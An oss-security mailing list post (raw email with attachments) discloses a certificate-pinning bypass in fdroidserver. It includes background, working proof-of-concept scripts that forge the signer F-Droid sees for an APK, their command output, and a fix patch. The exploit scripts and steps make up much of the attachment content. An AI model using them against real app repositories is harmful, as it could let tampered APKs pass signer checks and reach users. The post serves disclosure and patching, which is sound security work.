Received: (qmail 18024 invoked by uid 550); 8 Apr 2024 19:13:09 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 14224 invoked from network); 8 Apr 2024 19:11:13 -0000
Authentication-Results: ext-mx-out013.mykolab.com (amavis);
 dkim=pass (4096-bit key) reason="pass (just generated, assumed good)"
 header.d=kolabnow.com
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=kolabnow.com; h=
	content-disposition:content-type:content-type:mime-version
	:message-id:subject:subject:from:from:date:date:received
	:received:received; s=dkim20160331; t=1712603460; x=1714417861;
	 bh=tsH1hetu7WMwIrRxaLjr2aMgUrlQKUepHnJFXiEfIeA=; b=MfOsWPqOcR8X
	RTDlTr7tjz4sLLk1/ILWqQX8tNzU8x8RZKHe1BBj7WDvivB117rmEZF3oWEEoddA
	N7ATABAGJkAtfdLVMGHKGBvkp3R3vnwfgZw+Ju0qYNx5lmVfnZII/2Oh0z81u+2m
	0niDR3GM/aTaoufuJK87TgRz3ZvUZ+YGF19HqN5+xvpQ/b6w7dQvRQeRCdCZOsUj
	RzNdfAilMpfJZacUhJXBYLJWRbnRy3qHu3V15Oc9fknloDllMdkQa03Ama8mZNhm
	IbU69ku+sitEudUhBmxtEv9W2JX+Jcq1cR9p4URjofNqSsrvOyKOQS3/gS0p31/T
	V0rlK0S6DP5oDgL12Sp0jANNAZTFqLudhx7VyaEz5RsfQRb2ULkz0GdE4Ah6pRfJ
	MTPgCUzo02qVPckuR89+NgXGZN6h/+0DN9BljXczcZ5um77z0HLkzCPs4JpnX3Gk
	iT5sn/wVNbszBWkZUrStO5bTNJKFO2cMj7cvrUFE3pXOhATMlCqwkwPrnQg08JBV
	Cq9UE63ICGt0J6b7emiaZpa+XuUXK3UEy6lraZ3oYx2voyGEuRY4XGeq5h6Qh1ZK
	AxNV6Kc+PJR0nNCJGWsQELdm6+Ho5pMFxoJE5m0mkkepZjwMcfyijAMDP/2UxYYu
	CwE2jNKl+8J9Zfm8T/1tNU+xBKDdu5E=
X-Virus-Scanned: amavis at mykolab.com
Date: Mon, 8 Apr 2024 21:10:58 +0200
From: Fay Stegerman <flx@obfusk.net>
To: oss-security@lists.openwall.com
Message-ID: <ZhRBQi_ubFGorfTQ@nihonium>
MIME-Version: 1.0
Content-Type: multipart/mixed; boundary="X1NMQqNv4K1aEPmo"
Content-Disposition: inline
Subject: [oss-security] PoC for fdroidserver AllowedAPKSigningKeys certificate pinning bypass

--X1NMQqNv4K1aEPmo
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline

Hi!

This is published here: https://github.com/obfusk/fdroid-fakesigner-poc.

I've attached the PoC and patch and included the text from the README below.

- Fay

============================================================================

# F-Droid Fake Signer PoC

PoC for fdroidserver AllowedAPKSigningKeys certificate pinning bypass.

## Background

We started looking into Android APK Signing Block oddities at the request of
F-Droid [1] on 2021-08-25; we opened F-Droid issue "APK Signing Block
considerations" [2] on 2022-10-19.  No action was taken as a result.

We published the "Android APK Signing Block Payload PoC" [3] to the
Reproducible Builds mailing list [4] on 2023-01-31.

> But the Android APK Signature Scheme v2/v3 actually allows embedding
> arbitrary data (or code) in the signing block, meaning that two APKs with
> the exact same valid signature -- though not a bit-by-bit identical
> signing block -- can behave differently.

Jason Donenfeld reported "Potential security hazard:
apk_signer_fingerprint() looks at certs in reverse order that Android checks
them" [5] on 2023-05-05; no action was taken to fix this bug.

> However, there's a discrepancy between how these certificates are
> extracted and how Android actually implements signature checks. [...]
> Notice how [the google flowchart [6]] checks v3, then v2, and then v1.
> Yet the [F-Droid] code above looks at v1, then v2, and then v3, in reverse
> order. So v1 could have a bogus signer that some versions of Android never
> even look at, yet fdroid makes a security decision based on it. Yikes!
> Also, it's worth noting that apk_signer_fingerprint() also does not bother
> validating that the signatures are correct.

Andreas Itzchak Rehberg (IzzyOnDroid) reported about "BLOBs in APK signing
blocks" in "Ramping up security: additional APK checks are in place with the
IzzyOnDroid repo" [7] on 2024-03-25.  The accompanying German article
"Android-Apps auf dem Seziertisch: Eine vertiefte Betrachtung" [8] points
out that we noticed that that apksigner and androguard handle duplicate
signing blocks rather differently: the former only sees the first, the
latter only the last, which allows all kinds of shenanigans.

## Observations

We observed that embedding a v1 (JAR) signature file in an APK with minSdk
>= 24 will be ignored by Android/apksigner, which only checks v2/v3 in that
case.  However, since fdroidserver checks v1 first, regardless of minSdk,
and does not verify the signature, it will accept a "fake" certificate and
see an incorrect certificate fingerprint.

We also realised that the above mentioned discrepancy between apksigner and
androguard (which fdroidserver uses to extract the v2/v3 certificates) can
be abused here as well.  Simply copying the v2/v3 signature from a different
APK and appending it to the APK Signing Block will not affect apksigner's
verification, but androguard, and thus also fdroidserver, will see only the
second block.  Again, the signature is not verified, a "fake" certificate
accepted, and an incorrect fingerprint seen.

As a result, it is trivial to bypass the AllowedAPKSigningKeys certificate
pinning, as we can make fdroidserver see whatever certificate we want
instead of the one Android/apksigner does.  Note that we don't need a valid
signature for the APK (we really only need a copy of the DER certificate,
though having another APK signed with the certificate we want to use makes
things easy).

## PoC

NB: you currently need the signing branch of apksigtool [9].

NB: the "fake" signer shown here is from the official F-Droid client (its
APK has a v1+v2+v3 signature), the one apksigner sees is randomly generated
by make-key.sh; the app.apk used for testing had minSdk 26 and a v2
signature only.  Using APKs with other signature scheme combinations is
certainly possible, but might require adjusting the PoC code accordingly.

```
$ ./make-key.sh             # generates a dummy key
$ python3 make-poc-v1.py    # uses app.apk (needs minSdk >= 24) as base, adds fake.apk .RSA
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
$ python3 make-poc-v2.py    # uses app.apk as base, adds signing block from fake.apk
$ python3 fdroid.py         # verifies and has fake.apk as signer according to F-Droid
True
43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab
$ apksigner verify -v --print-certs poc.apk | grep -E '^Verified using|Signer #1 certificate (DN|SHA-256)'
Verified using v1 scheme (JAR signing): false
Verified using v2 scheme (APK Signature Scheme v2): true
Verified using v3 scheme (APK Signature Scheme v3): true
Verified using v4 scheme (APK Signature Scheme v4): false
Signer #1 certificate DN: CN=oops
Signer #1 certificate SHA-256 digest: 029df1354735e81eb97c9bbef2185c8ead3bc78ae874c03a6e96e1e1435ac519
```

```
$ mkdir fakesigner
$ cd fakesigner
$ fdroid init -d oops --repo-keyalias fakesigner
$ mkdir metadata
$ printf 'Name: MyApp\nAllowedAPKSigningKeys: 43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab\n' > metadata/some.app.id.yml
$ cp /path/to/poc.apk repo/
$ fdroid update
$ jq '.packages[].versions[].manifest.signer.sha256' < repo/index-v2.json
[
  "43238d512c1e5eb2d6569f4a3afbf5523418b82e0a3ed1552770abb9a9c9ccab"
]
```

## Patch

The fdroidserver.patch changes the order so it matches Android's v3 before
v2 before v1, and monkey-patches androguard to see the first block instead
of the last one if there are duplicates.  This is still likely to be
incomplete, but prevents the known bypasses described here.

## References

* [1] https://salsa.debian.org/reproducible-builds/diffoscope/-/issues/246
* [2] https://gitlab.com/fdroid/fdroidserver/-/issues/1056
* [3] https://github.com/obfusk/sigblock-code-poc
* [4] https://lists.reproducible-builds.org/pipermail/rb-general/2023-January/002825.html
* [5] https://gitlab.com/fdroid/fdroidserver/-/issues/1128
* [6] https://source.android.com/docs/security/features/apksigning/v3
* [7] https://android.izzysoft.de/articles/named/iod-scan-apkchecks
* [8] https://www.kuketz-blog.de/android-apps-auf-dem-seziertisch-eine-vertiefte-betrachtung/
* [9] https://github.com/obfusk/apksigtool

## Links

* https://github.com/obfusk/apksigcopier

--X1NMQqNv4K1aEPmo
Content-Type: application/x-sh
Content-Disposition: attachment; filename="make-key.sh"
Content-Transfer-Encoding: quoted-printable

#!/bin/bash=0A=
openssl req -x509 -newkey rsa:2048 -sha512 -outform DER -out cert-rsa.der -=
days 10000 -nodes -subj '/CN=3Doops' -keyout - | openssl pkcs8 -topk8 -nocr=
ypt -outform DER -out privkey-rsa.der=0A=

--X1NMQqNv4K1aEPmo
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v1.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigcopier
import apksigtool
import zipfile


with zipfile.ZipFile("fake.apk", "r") as zf:
    for info in zf.infolist():
        if info.filename.startswith("META-INF/") and info.filename.endswith(".RSA"):
            print(info.filename)
            meta = [(info, zf.read(info.filename))]
            break

apksigcopier.copy_apk("app.apk", "poc-unsigned.apk")
apksigcopier.patch_meta(meta, "poc-unsigned.apk")

apksigtool.do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
                   key="privkey-rsa.der", no_v1=True)

--X1NMQqNv4K1aEPmo
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="make-poc-v2.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import apksigcopier
import apksigtool
import dataclasses


apksigcopier.copy_apk("app.apk", "poc-unsigned.apk")

apksigtool.do_sign("poc-unsigned.apk", "poc.apk", cert="cert-rsa.der",
                   key="privkey-rsa.der", no_v1=True)

_, sig_block_a = old_v2_sig_a = apksigtool.extract_v2_sig("poc.apk")
_, sig_block_b = old_v2_sig_b = apksigtool.extract_v2_sig("fake.apk")
blk_a = apksigtool.parse_apk_signing_block(sig_block_a, allow_nonzero_verity=True)
blk_b = apksigtool.parse_apk_signing_block(sig_block_b, allow_nonzero_verity=True)
blk_poc = dataclasses.replace(blk_a, pairs=blk_a.pairs + blk_b.pairs)
apksigtool.replace_apk_signing_block("poc.apk", blk_poc.dump(), old_v2_sig=old_v2_sig_a)

--X1NMQqNv4K1aEPmo
Content-Type: text/x-python; charset=us-ascii
Content-Disposition: attachment; filename="fdroid.py"

#!/usr/bin/python3
# encoding: utf-8
# SPDX-FileCopyrightText: 2024 FC (Fay) Stegerman <flx@obfusk.net>
# SPDX-License-Identifier: GPL-3.0-or-later

import fdroidserver.common as c     # type: ignore[import-untyped]


class FakeOptions:
    verbose = True


c.config = {}
c.fill_config_defaults(c.config)
c.options = FakeOptions()

print(c.verify_apk_signature("poc.apk"))
print(c.apk_signer_fingerprint("poc.apk"))

--X1NMQqNv4K1aEPmo
Content-Type: text/x-diff; charset=us-ascii
Content-Disposition: attachment; filename="fdroidserver.patch"

diff --git a/fdroidserver/common.py b/fdroidserver/common.py
index bc4265e..bd1a4c8 100644
--- a/fdroidserver/common.py
+++ b/fdroidserver/common.py
@@ -3001,28 +3001,35 @@ def signer_fingerprint(cert_encoded):
 
 def get_first_signer_certificate(apkpath):
     """Get the first signing certificate from the APK, DER-encoded."""
+    class FDict(dict):
+        def __setitem__(self, k, v):
+            if k not in self:
+                super().__setitem__(k, v)
+
     certs = None
     cert_encoded = None
-    with zipfile.ZipFile(apkpath, 'r') as apk:
-        cert_files = [n for n in apk.namelist() if SIGNATURE_BLOCK_FILE_REGEX.match(n)]
-        if len(cert_files) > 1:
-            logging.error(_("Found multiple JAR Signature Block Files in {path}").format(path=apkpath))
-            return None
-        elif len(cert_files) == 1:
-            cert_encoded = get_certificate(apk.read(cert_files[0]))
-
-    if not cert_encoded and use_androguard():
+    if use_androguard():
         apkobject = _get_androguard_APK(apkpath)
-        certs = apkobject.get_certificates_der_v2()
+        apkobject._v2_blocks = FDict()
+        certs = apkobject.get_certificates_der_v3()
         if len(certs) > 0:
-            logging.debug(_('Using APK Signature v2'))
+            logging.debug(_('Using APK Signature v3'))
             cert_encoded = certs[0]
         if not cert_encoded:
-            certs = apkobject.get_certificates_der_v3()
+            certs = apkobject.get_certificates_der_v2()
             if len(certs) > 0:
-                logging.debug(_('Using APK Signature v3'))
+                logging.debug(_('Using APK Signature v2'))
                 cert_encoded = certs[0]
 
+    if not cert_encoded:
+        with zipfile.ZipFile(apkpath, 'r') as apk:
+            cert_files = [n for n in apk.namelist() if SIGNATURE_BLOCK_FILE_REGEX.match(n)]
+            if len(cert_files) > 1:
+                logging.error(_("Found multiple JAR Signature Block Files in {path}").format(path=apkpath))
+                return None
+            elif len(cert_files) == 1:
+                cert_encoded = get_certificate(apk.read(cert_files[0]))
+
     if not cert_encoded:
         logging.error(_("No signing certificates found in {path}").format(path=apkpath))
         return None

--X1NMQqNv4K1aEPmo--
